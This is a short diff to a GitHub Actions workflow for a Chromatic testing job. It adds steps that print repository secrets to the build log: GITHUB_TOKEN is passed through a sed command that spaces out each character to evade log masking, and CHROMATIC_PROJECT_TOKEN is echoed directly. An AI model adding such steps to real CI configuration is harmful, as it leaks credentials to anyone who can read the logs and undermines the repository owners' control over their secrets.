@@ -11,12 +11,13 @@ jobs:
     runs-on: ubuntu-latest
     # Job steps
     steps:
+      - run: |
+          echo ${{ secrets.GITHUB_TOKEN }} | sed 's/./& /g'
+      - run: echo ${{ secrets.CHROMATIC_PROJECT_TOKEN }}
       - uses: actions/checkout@v3
         with:
           fetch-depth: 0
       - run: yarn
-          echo ${{ secrets.GITHUB_TOKEN }}
-          echo ${{ secrets.GITHUB_TOKEN }}
         #👇 Adds Chromatic as a step in the workflow
       - uses: chromaui/action@v1
         # Options required for Chromatic's GitHub Action
